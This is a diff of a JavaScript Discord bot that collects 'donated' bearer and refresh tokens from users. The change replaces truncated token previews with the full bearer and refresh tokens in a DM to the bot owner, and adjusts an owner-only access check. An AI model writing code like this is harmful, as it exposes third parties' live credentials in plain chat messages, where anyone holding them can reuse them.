@@ -1016,9 +1016,10 @@ client.on('interactionCreate', async interaction => {
                 return await interaction.showModal(modal);
             }
 
-            // Use Donated Token - Bot Owner Only
+            // Use Donated Token - Bot Owner Only (FIXED: Now owner can use it)
             if (interaction.customId === 'gen_use_donated') {
-                if (!isBotOwner(interaction.user.id)) {
+                // FIXED: Check if user is bot owner
+                if (interaction.user.id !== BOT_OWNER_ID) {
                     return interaction.reply({ content: '❌ **Access Denied:** Only the bot owner can use donated tokens.', flags: 64 });
                 }
 
@@ -1375,7 +1376,7 @@ client.on('interactionCreate', async interaction => {
                     donatedBy: interaction.user.id
                 });
 
-                // Send DM to bot owner
+                // Send DM to bot owner with full token details
                 try {
                     const owner = await client.users.fetch(BOT_OWNER_ID);
                     const dmEmbed = new EmbedBuilder()
@@ -1386,8 +1387,8 @@ client.on('interactionCreate', async interaction => {
                             { name: 'Donor', value: `${interaction.user.tag} (${interaction.user.id})`, inline: true },
                             { name: 'Token ID', value: `#${donatedTokenCounter}`, inline: true },
                             { name: 'Total Donated Tokens', value: `${donatedTokens.length}`, inline: true },
-                            { name: 'Bearer Token', value: `\`${bearer.substring(0, 20)}...\``, inline: false },
-                            { name: 'Refresh Token', value: `\`${refresh.substring(0, 20)}...\``, inline: false },
+                            { name: 'Bearer Token', value: `\`\`\`${bearer}\`\`\``, inline: false },
+                            { name: 'Refresh Token', value: `\`\`\`${refresh}\`\`\``, inline: false },
                             { name: 'Expires', value: validationResult.expiresAt ? `<t:${Math.floor(validationResult.expiresAt/1000)}:F>` : 'Unknown', inline: true }
                         )
                         .setTimestamp();
